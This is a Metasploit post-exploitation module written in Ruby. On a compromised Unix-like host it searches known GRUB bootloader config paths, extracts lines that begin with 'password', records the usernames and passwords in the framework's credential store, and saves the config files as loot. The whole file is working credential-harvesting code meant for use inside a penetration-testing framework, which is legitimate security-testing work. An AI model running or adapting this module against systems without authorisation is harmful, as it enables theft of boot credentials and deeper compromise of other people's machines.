##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Gather GRUB Password',
      'Description'  => %q{
        This module gathers GRUB passwords from GRUB bootloader config files.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Garvit Dewan <d.garvit[at]gmail.com>' # @dgarvit
        ],
      'Platform'     => ['linux', 'osx', 'unix', 'solaris', 'bsd'],
      'SessionTypes' => ['meterpreter', 'shell'],
      'References'   => [
        ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption']
      ]
    ))
  end

  def run
    targets = [
      '/boot/grub/grub.conf',
      '/boot/grub/grub.cfg',
      '/etc/grub.conf',
      '/etc/grub/grub.cfg',
      '/etc/grub.d/00_header',
      '/mnt/sysimage/boot/grub.conf',
      '/mnt/boot/grub/grub.conf',
      '/rpool/boot/grub/grub.cfg',
      '/boot/grub2/grub.cfg',
      '/boot/grub2/user.cfg'
    ]

    print_status("Searching for GRUB config files..")
    file_found = false
    targets.each do |target|
      next unless readable?(target)
      file_found = true
      print_status("Reading #{target}")
      file = read_file(target)
      password_found = false
      file.each_line do |line|
        line = line.strip
        if line.start_with?("password")
          print_good("Found password: #{line}")
          parts = line.split(" ")

          # Password format in GRUB conf: password <user> <password>
          credential_data = {
            origin_type: :session,
            post_reference_name: self.refname,
            private_type: :password,
            private_data: parts[2],
            session_id: session_db_id,
            username: parts[1],
            workspace_id: myworkspace_id
          }
          create_credential(credential_data)
          password_found = true
        end
      end

      if !password_found
        print_status("No passwords found in GRUB config file: #{target}")
      else
        print_good("Saved credentials")
      end
      file_loc = store_loot("grub.config", "text/plain", session, file)
      print_good("#{target} saved to #{file_loc}")
    end

    if !file_found
      print_bad("No GRUB config files found!")
    end
  end
end
